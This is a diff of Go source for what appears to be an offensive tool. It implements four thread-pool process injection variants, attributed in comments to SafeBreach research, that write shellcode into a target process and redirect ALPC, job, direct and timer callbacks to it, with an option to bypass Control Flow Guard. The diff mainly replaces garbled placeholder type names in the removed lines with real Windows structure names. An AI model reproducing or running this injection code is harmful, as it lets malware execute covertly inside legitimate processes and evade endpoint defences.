@@ -59,7 +59,7 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += "[+] Created port item structure associated with shellcode\n"
 
 	// Explicitly set the Direct.Callback to shellcode address (similar to variant 4)
-	pAlpcStruct := (*FULL_port item)(unsafe.Pointer(pTpAlpc))
+	pAlpcStruct := (*FULL_TP_ALPC)(unsafe.Pointer(pTpAlpc))
 	pAlpcStruct.Direct.Callback = shellcodeAddr
 	output += "[+] Set Direct.Callback to shellcode address\n"
 
@@ -96,7 +96,7 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += fmt.Sprintf("[+] Created ALPC port '%s'\n", portName)
 
 	// Step 9: Allocate memory for port item in target process
-	var tpAlpc FULL_port item
+	var tpAlpc FULL_TP_ALPC
 	tpAlpcAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpAlpc)), PAGE_READWRITE)
 	if err != nil {
 		return output, fmt.Errorf("remote allocation for port item failed: %w", err)
@@ -213,7 +213,7 @@ func executeVariant6(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += "[+] Created job item structure associated with shellcode\n"
 
 	// Step 7: Allocate memory for job item in target process
-	var tpJob FULL_job item
+	var tpJob FULL_TP_JOB
 	tpJobAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpJob)), PAGE_READWRITE)
 	if err != nil {
 		return output, fmt.Errorf("remote allocation for job item failed: %w", err)
@@ -295,10 +295,10 @@ func executeVariant7(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	}
 
 	// Step 4: Create and write direct item structure
-	tpDirect := direct item{
+	tpDirect := TP_DIRECT{
 		Callback: shellcodeAddr,
 	}
-	tpDirectBytes := (*[unsafe.Sizeof(direct item{})]byte)(unsafe.Pointer(&tpDirect))[:]
+	tpDirectBytes := (*[unsafe.Sizeof(TP_DIRECT{})]byte)(unsafe.Pointer(&tpDirect))[:]
 
 	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
 	if err != nil {
@@ -384,7 +384,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += "[+] Created timer item structure associated with shellcode\n"
 
 	// Step 7: Allocate memory for timer item in target process
-	var tpTimer FULL_timer item
+	var tpTimer FULL_TP_TIMER
 	tpTimerAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpTimer)), PAGE_READWRITE)
 	if err != nil {
 		return output, fmt.Errorf("remote allocation for timer item failed: %w", err)
@@ -393,7 +393,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 
 	// Step 8: Cast the pointer to access the structure directly like SafeBreach does
 	// SafeBreach directly modifies the structure returned by CreateThreadpoolTimer
-	pTimer := (*FULL_timer item)(unsafe.Pointer(pTpTimer))
+	pTimer := (*FULL_TP_TIMER)(unsafe.Pointer(pTpTimer))
 
 	// Step 9: Modify timer item structure for insertion
 	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)
@@ -412,7 +412,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	// Set up circular lists for WindowStart and WindowEnd Children only (NOT Siblings - SafeBreach doesn't set those)
 	// Calculate remote addresses for the Window*Links.Children fields
 	// Use dummy struct for offset calculation
-	var dummyTimer FULL_timer item
+	var dummyTimer FULL_TP_TIMER
 	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks.Children))
 	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks.Children))
 
@@ -422,7 +422,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	pTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr
 
 	// Step 10: Write timer item to target process
-	timerBytes := (*[unsafe.Sizeof(FULL_timer item{})]byte)(unsafe.Pointer(pTpTimer))[:]
+	timerBytes := (*[unsafe.Sizeof(FULL_TP_TIMER{})]byte)(unsafe.Pointer(pTpTimer))[:]
 	bytesWritten, err := injectWriteMemory(hProcess, tpTimerAddr, timerBytes)
 	if err != nil {
 		return output, fmt.Errorf("memory write for timer item failed: %w", err)
@@ -437,7 +437,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	targetTpPoolAddr := workerFactoryInfo.StartParameter
 
 	// Calculate offsets step by step - Go doesn't handle nested offsetof well
-	var dummyPool FULL_pool
+	var dummyPool FULL_TP_POOL
 	var dummyTimerQueue TPP_TIMER_QUEUE
 	var dummySubQueue TPP_TIMER_SUBQUEUE
 
